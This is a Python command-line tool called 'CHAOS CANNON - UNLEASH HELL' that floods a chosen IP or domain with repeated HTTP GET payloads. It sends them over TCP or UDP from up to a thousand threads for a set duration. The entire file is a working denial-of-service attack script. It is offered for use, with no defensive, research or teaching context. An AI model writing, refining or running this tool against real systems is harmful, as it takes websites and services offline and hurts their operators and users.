import argparse
import random
import socket
import threading
import time
import os

def flood(target, port, duration, method):
    payload = "GET / HTTP/1.1\r\nHost: " + target + "\r\n\r\n"
    
    if method == "udp":
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    else:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target, port)) 
    
    startTime = time.time()
    while time.time() - startTime < duration:
        if method == "udp":
            for _ in range(10):
                sock.sendto(payload.encode(), (target, port))
        else:  
            sock.send(payload.encode())
            
    sock.close()

def main():
    parser = argparse.ArgumentParser(description="CHAOS CANNON - UNLEASH HELL")
    
    parser.add_argument("target", help="Target IP or domain")
    parser.add_argument("-p", "--port", type=int, default=80, help="Target port")
    parser.add_argument("-d", "--duration", type=int, default=60, help="Attack duration in seconds")
    parser.add_argument("-t", "--threads", type=int, default=1000, help="Number of threads")
    parser.add_argument("-m", "--method", default="tcp", help="Attack method: tcp, udp")
    
    args = parser.parse_args()
    
    print(" 🌠 CHAOS CANNON - UNLEASH HELL 🌠")
    print(f"Target: {args.target}")
    print(f"Port: {args.port}")
    print(f"Duration: {args.duration}")
    print(f"Threads: {args.threads}")
    print(f"Method: {args.method}")
    print("attack starting in 3 seconds...")
    
    time.sleep(3)
    
    for _ in range(args.threads):
        thread = threading.Thread(target=flood, args=(args.target, args.port, args.duration, args.method))
        thread.start()

if __name__ == "__main__":
    main()
